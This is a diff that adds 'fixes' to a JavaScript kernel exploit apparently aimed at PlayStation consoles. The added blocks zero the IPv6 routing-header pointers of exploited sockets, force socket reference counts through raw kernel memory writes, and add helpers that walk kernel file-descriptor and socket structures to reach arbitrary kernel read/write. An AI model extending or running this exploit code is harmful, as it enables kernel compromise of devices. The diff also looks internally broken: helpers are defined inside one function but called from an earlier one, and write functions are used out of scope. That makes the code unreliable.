@@ -42,6 +42,8 @@ import * as config from './config.mjs';
 
 const t1 = performance.now();
 
+
+
 // check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
     const value = config.target;
@@ -1473,6 +1475,37 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
+
+
+
+    
+// === FIX: reset rthdr for all sds ===
+for (let i = 0; i < sds.length; i++) {
+  const pkto = get_sock_pktopts(sds[i], kmem.read64.bind(kmem));
+  write64.call(kmem, pkto + off_ip6po_rthdr, 0n);
+}
+
+// AZZERA anche per reclaim_sock e worker
+const re_pkto = get_sock_pktopts(reclaim_sock, kmem.read64.bind(kmem));
+write64.call(kmem, re_pkto + off_ip6po_rthdr, 0n);
+write64.call(kmem, worker_pktopts + off_ip6po_rthdr, 0n);
+
+// === FIX: bump so_count per prevenire free accidentali ===
+const sock_increase_ref = [
+  ipv6_kernel_rw.data.master_sock,
+  ipv6_kernel_rw.data.victim_sock,
+  master_sock,
+  worker_sock,
+  reclaim_sock,
+];
+
+for (const sd of sock_increase_ref) {
+  const sock_addr = get_fd_data_addr(sd, kmem.read64.bind(kmem));
+  write32.call(kmem, sock_addr + 0x0, 0x100);
+}
+
+log("fixes applied");
+    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1757,6 +1790,28 @@ export async function kexploit() {
         log('\nSTAGE: Get arbitrary kernel read/write');
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
+
+        const { read64, write64, read32, write32 } = kmem;
+const {
+  CURPROC_OFILES,
+  SIZEOF_OFILES,
+  SO_PCB,
+  INPCB_PKTOPTS
+} = kernel_offset;
+
+function get_fd_data_addr(sock, read_fn) {
+  const fdesc = kernel.addr.curproc
+              + CURPROC_OFILES
+              + BigInt(sock) * BigInt(SIZEOF_OFILES);
+  const filep = read_fn(fdesc);
+  return read_fn(filep);
+}
+
+function get_sock_pktopts(sock, read_fn) {
+  const sock_data = get_fd_data_addr(sock, read_fn);
+  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
+  return read_fn(pcb + BigInt(INPCB_PKTOPTS));
+}
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
